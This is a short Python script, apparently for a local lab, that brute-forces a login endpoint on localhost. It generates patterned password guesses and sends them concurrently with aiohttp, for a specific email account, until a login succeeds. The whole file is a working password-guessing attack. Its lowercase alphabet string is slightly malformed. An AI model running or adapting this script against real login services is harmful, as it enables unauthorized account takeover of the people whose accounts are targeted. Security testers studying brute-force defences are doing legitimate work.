import requests
import aiohttp
import asyncio
import time

login_url = "http://localhost:8080/{}".format("auth/users/login")

passfound = False

def build_queue():

    queue = []

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = "abcdefghijklmniopqrstuvxyz"
    numbers = "0123456789"

    for up_letter in uppercase_letters: 
        for low_letter in lowercase_letters:
            for number in numbers:
                queue.append(f"{up_letter}{number}{low_letter}......")                
    return queue

async def login_amy(async_queue):
    global passfound
    async with aiohttp.ClientSession() as session:
        while not async_queue.empty() and not passfound:
            password = await async_queue.get()
            print(f"Trying password: {password}")
            async with session.put(login_url, json={
                'username': 'lindseym@gmail.com', 
                'password': password,
                'isDictionaryAttack': True
                }) as response:
                status = response.status
                if status >= 200 and status < 300:
                  passfound = True
                  print(f"password found: {password}")

async def main(password_queue):

    async_queue = asyncio.Queue()

    for password in password_queue:
        await async_queue.put(password)

    task = [asyncio.create_task(login_amy(async_queue)) for x in range(10)]
    await asyncio.gather(*task)

    return False

if __name__ == "__main__": 
    password_queue = build_queue()
    asyncio.run(main(password_queue))
